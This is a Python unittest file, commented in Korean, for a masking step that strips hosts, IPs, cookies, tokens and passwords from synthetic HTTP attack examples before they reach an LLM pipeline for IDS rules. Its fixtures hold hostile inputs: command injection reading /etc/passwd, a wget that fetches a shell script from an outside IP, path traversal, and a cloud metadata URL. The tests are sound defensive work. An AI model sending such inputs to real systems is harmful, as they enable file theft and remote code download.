"""참고 예시 마스킹(3_0b_mask.py)과 3.1 연결 시험. 합성 payload 만 쓴다 (실제 데이터 금지).

    python -m unittest discover -s tests -v

T1 헤더 값 바꾸기 · T2 누출 검사 · T3 같은 값은 같은 자리표시 값 · T4 두 번 해도 같음(멱등) · T5 룰과 무관한 IP 는 바꿔도 보냄
T6 룰 조건이 바꾼 값 안에 있으면 빼고 원래 값을 보내지 않음 · T7 깨진 입력·오류는 예외 없이 빼기(fail closed)
T8 설정 '아니오' 면 그대로 · T9 3.1 실제 실행(임시 폴더)·dry-run, _mask 칸은 LLM 에 보내지 않음
"""

import importlib.util
import json
import logging
import shutil
import tempfile
import unittest
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, BASE / file)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


M = load("mask_t", "3_0b_mask.py")
C = M.load_common()

# 합성 비밀값 (실제 값 아님). 출력에 하나라도 남으면 실패
SECRETS = ["intranet.corp.example-co.local", "10.20.30.40", "172.20.1.7", "8.8.4.4", "2400:cb00:2048:1::c629:d7a2",
           "kim.minsu@corp-mail.test", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NSJ9.c2lnbmF0dXJlMTIz",
           "AbCdEf1234567890", "S3cr3tP4ss", "9F8E7D6C5B4A3921", "dXNlcjpyZWFsUGFzcw==",
           "d41d8cd98f00b204e9800998ecf8427e", "Q2xpZW50U2VjcmV0VmFsdWUxMjM0NTY3ODkwYWJjZA",
           "portal.corp.example-co.local"]

SAMPLE = (
    "POST /app/upload.php?id=7&api_key=AbCdEf1234567890&next=/home HTTP/1.1\n"
    "Host: intranet.corp.example-co.local:8080\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36\n"
    "Cookie: JSESSIONID=9F8E7D6C5B4A3921; lang=ko\n"
    "Authorization: Basic dXNlcjpyZWFsUGFzcw==\n"
    "X-Forwarded-For: 10.20.30.40, 8.8.4.4\n"
    "X-Real-IP: 172.20.1.7\n"
    "Referer: https://portal.corp.example-co.local/login?from=10.20.30.40\n"
    "Origin: https://portal.corp.example-co.local\n"
    "Content-Type: application/json\n"
    "\n"
    '{"user":"kim.minsu@corp-mail.test","password":"S3cr3tP4ss","token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NSJ9.c2lnbmF0dXJlMTIz",'
    '"hash":"d41d8cd98f00b204e9800998ecf8427e","client_secret":"Q2xpZW50U2VjcmV0VmFsdWUxMjM0NTY3ODkwYWJjZA",'
    '"v6":"2400:cb00:2048:1::c629:d7a2","cmd":";cat /etc/passwd"}'
)


def rule(conditions, rid="sid:1"):
    return {"id": rid, "attack_type": "command_injection", "side": "request", "rule": f"alert http any any -> any any ({rid})",
            "conditions": conditions}


class MaskTest(unittest.TestCase):
    def test_t1_headers_masked_attack_kept(self):
        out, n = M.mask_example(SAMPLE)
        self.assertIn("Host: www.example.com:8080", out)
        self.assertIn("Cookie: JSESSIONID=x; lang=x", out)
        self.assertIn("Authorization: Basic dXNlcjpwYXNz", out)
        self.assertIn("Referer: https://example.com/login", out)
        self.assertIn("Origin: https://example.com", out)
        self.assertTrue(out.startswith("POST /app/upload.php?id=7&"))
        self.assertIn('"cmd":";cat /etc/passwd"', out)                    # 공격 부분은 그대로
        self.assertIn("Chrome/124.0.0.0", out)                             # 브라우저 버전은 IP 로 보지 않음
        for k in ("host", "cookie", "authorization", "referer_origin", "ipv4", "ipv6", "email", "jwt", "secret_param",
                  "long_random"):
            self.assertGreater(n.get(k, 0), 0, k)

    def test_t2_no_leak(self):
        out, _ = M.mask_example(SAMPLE)
        for s in SECRETS:
            self.assertNotIn(s, out)

    def test_t3_same_value_same_placeholder(self):
        out, _ = M.mask_example("GET /a?ip=10.20.30.40&b=10.20.30.40&c=10.9.9.9 HTTP/1.1\nX-Forwarded-For: 10.20.30.40\n\n")
        self.assertEqual(out.count("192.0.2.1"), 3)
        self.assertEqual(out.count("192.0.2.2"), 1)

    def test_t4_idempotent(self):
        once, _ = M.mask_example(SAMPLE)
        twice, n2 = M.mask_example(once)
        self.assertEqual(once, twice)
        self.assertEqual(n2, {})

    def test_t5_payload_ip_kept_when_rule_unrelated(self):
        text = "GET /cgi-bin/x.cgi?c=wget%20http://203.0.113.9/a;wget%20http://8.8.8.8/s.sh HTTP/1.1\nHost: 8.8.8.8\n\n"
        r = rule([{"type": "content", "value": "wget", "in": "uri"}, {"type": "content", "value": "/cgi-bin/", "in": "uri"}])
        sent, st = M.safe_examples(C, [text], r, 3)
        self.assertEqual(st["sent"], 1)
        self.assertNotIn("8.8.8.8", sent[0])
        self.assertIn("203.0.113.9", sent[0])                              # 이미 문서용 IP 는 그대로

    def test_t6_rule_in_masked_value_drops_example(self):
        text = "GET /index.php HTTP/1.1\nHost: www.site.test\nCookie: SESSIONID=../../etc/passwd\n\n"
        r = rule([{"type": "content", "value": "../../etc/passwd", "in": "cookie"}])
        sent, st = M.safe_examples(C, [text, text], r, 3)
        self.assertEqual(sent, [])
        self.assertEqual(st["drop_rule"], 2)
        # 다음 후보로 채움: 조건이 URI 에 있는 예시는 보냄
        ok = "GET /download?file=../../etc/passwd HTTP/1.1\nHost: www.site.test\nCookie: SESSIONID=abc\n\n"
        r2 = rule([{"type": "content", "value": "../../etc/passwd", "in": "payload"}])
        sent, st = M.safe_examples(C, [text, ok], r2, 1)
        self.assertEqual(st, {"in": 2, "sent": 1, "drop_error": 0, "drop_rule": 1, "masked": {"host": 1, "cookie": 1}})
        self.assertNotIn("SESSIONID=abc", sent[0])

    def test_t7_broken_inputs_and_errors_fail_closed(self):
        for t in ["", "garbage without http", "\x00\x01\xff" * 50, "GET / HTTP/1.1\nHost:\n\n" + "A" * 5000,
                  "GET /" + "%41" * 3000 + " HTTP/1.1\n\n", "\n\n\n", "Cookie: =;;==\n"]:
            out, _ = M.mask_example(t)
            self.assertIsInstance(out, str)
        self.assertEqual("A" * 64 in M.mask_example("GET /?x=" + "A" * 64 + " HTTP/1.1\n\n")[0], True)   # 반복은 무작위 아님
        with self.assertRaises(M.MaskError):
            M.mask_example(None)
        r = rule([{"type": "content", "value": "x", "in": "payload"}])
        sent, st = M.safe_examples(C, [None, 12345], r, 3)          # 오류 → 빼기, 원래 값은 보내지 않음
        self.assertEqual((sent, st["drop_error"]), ([], 2))
        orig = M.mask_example
        try:
            M.mask_example = lambda t: (_ for _ in ()).throw(M.MaskError("boom"))
            sent, st = M.safe_examples(C, [SAMPLE], r, 3)
            self.assertEqual((sent, st["drop_error"]), ([], 1))
        finally:
            M.mask_example = orig

    def test_keep_special_addresses(self):
        out, n = M.mask_example("GET /p?u=http://169.254.169.254/latest&l=127.0.0.1&z=0.0.0.0 HTTP/1.1\n\n")
        for a in ("169.254.169.254", "127.0.0.1", "0.0.0.0"):
            self.assertIn(a, out)
        self.assertEqual(n, {})

    def test_paths_not_random(self):
        p = "GET /wp-content/plugins/WPSecurity2/Includes/admin-ajax-handler2024/file.php HTTP/1.1\n\n"
        self.assertEqual(M.mask_example(p)[0], p)


class PrepareRequestsTest(unittest.TestCase):
    """T8·T9: 3_1_prepare_requests.main 을 임시 폴더에서 (실제 데이터·로그 폴더를 건드리지 않음)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="mask_t_"))
        inp = self.tmp / "05_llm_input" / "2026-01-01"
        (inp / "batches" / "delta").mkdir(parents=True)
        (inp / "summary.json").write_text("{}", encoding="utf-8")
        rules = [rule([{"type": "content", "value": ";cat ", "in": "body"}], "sid:1"),
                 rule([{"type": "content", "value": "../../etc/passwd", "in": "cookie"}], "sid:2"),
                 rule([{"type": "content", "value": "/x.php", "in": "uri"}], "sid:3")]
        (inp / "batches" / "delta" / "batch_0001.jsonl").write_text(
            "".join(json.dumps(r) + "\n" for r in rules), encoding="utf-8")
        cov = self.tmp / "07_llm_output" / "2026-01-01" / "_0_existing"
        cov.mkdir(parents=True)
        cookie_ex = "GET / HTTP/1.1\nHost: a.test\nCookie: s=../../etc/passwd\n\n"
        (cov / "coverage.json").write_text(json.dumps({
            "sid:1": {"count": 3, "examples": [SAMPLE, SAMPLE.replace("id=7", "id=8")]},
            "sid:2": {"count": 2, "examples": [cookie_ex]},
        }), encoding="utf-8")
        self.P = load("prep_t", "3_1_prepare_requests.py")
        self.run = {"참고 예시 수": "3", "기존 데이터 참고 기준": "50", "호출당 룰 수": "3", "생성 대상 side": "request",
                    "생성 제외 attack_type": "informational"}
        C2 = self.P.C
        C2.LLM_INPUT_DIR, C2.LLM_OUTPUT_DIR = self.tmp / "05_llm_input", self.tmp / "07_llm_output"
        C2.load_settings = lambda: ({}, {}, self.run)
        C2.generation_guard = lambda log, who: True
        log = logging.getLogger("prep_t")
        log.handlers[:] = [logging.NullHandler()]
        C2.setup_logging = lambda name: log
        self.req = self.tmp / "07_llm_output" / "2026-01-01" / C2.REQ_DIR

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def records(self):
        return [r for p in sorted(self.req.glob("delta_*.jsonl")) for r in C.read_jsonl(p)]

    def test_t9_masked_requests_and_meta_fields(self):
        self.assertEqual(self.P.main([]), 0)
        text = "".join(p.read_text(encoding="utf-8") for p in self.req.glob("delta_*.jsonl"))
        for s in SECRETS:
            self.assertNotIn(s, text)
        by = {r["id"]: r for r in self.records()}
        self.assertEqual(len(by["sid:1"]["existing_examples"]), 2)
        self.assertTrue(by["sid:1"]["_mask"]["on"] and by["sid:1"]["_mask"]["values"] > 0)
        self.assertNotIn("existing_examples", by["sid:2"])          # 룰 조건이 쿠키 안 → 예시 빠짐, 일반 생성
        self.assertEqual(by["sid:2"]["_mask"]["dropped"], 1)
        man = json.loads((self.req / "_manifest_delta.json").read_text(encoding="utf-8"))["masking"]
        self.assertEqual((man["enabled"], man["existing_examples_sent"], man["dropped_rule_broken"]), (True, 2, 1))
        self.assertNotIn("S3cr3tP4ss", json.dumps(man))
        # _mask 는 LLM 에 보내지 않는다 (3.2 생성 메시지, 3.3 검토 묶음)
        G = load("gen_t", "3_2_generate.py")
        msg = G.user_message(list(by.values()), 10, 5, examples=False)
        self.assertNotIn("_mask", msg)
        Rv = load("rev_t", "3_3_review.py")
        items = Rv.review_items(list(by.values()), {i: {"attack_type": "rce", "samples": []} for i in by})
        self.assertFalse(any("_mask" in it["rule"] for it in items))

    def test_t9_dry_run_writes_nothing(self):
        self.assertEqual(self.P.main(["--dry-run"]), 0)
        self.assertFalse(self.req.exists() and any(self.req.iterdir()))

    def test_t8_switch_off_sends_as_before(self):
        self.run["참고 예시 마스킹"] = "아니오"
        self.assertEqual(self.P.main([]), 0)
        by = {r["id"]: r for r in self.records()}
        self.assertEqual(by["sid:1"]["existing_examples"][0], SAMPLE)       # 예전과 같음 (비교용)
        self.assertEqual(by["sid:1"]["_mask"], {"on": False})

    def test_switch_change_rebuilds_pending(self):
        self.run["참고 예시 마스킹"] = "아니오"
        self.P.main([])
        self.run["참고 예시 마스킹"] = "예"
        self.P.main([])
        text = "".join(p.read_text(encoding="utf-8") for p in self.req.glob("delta_*.jsonl"))
        self.assertNotIn("S3cr3tP4ss", text)                                # 생성 전 요청은 마스킹된 것으로 다시 만듦


if __name__ == "__main__":
    unittest.main()
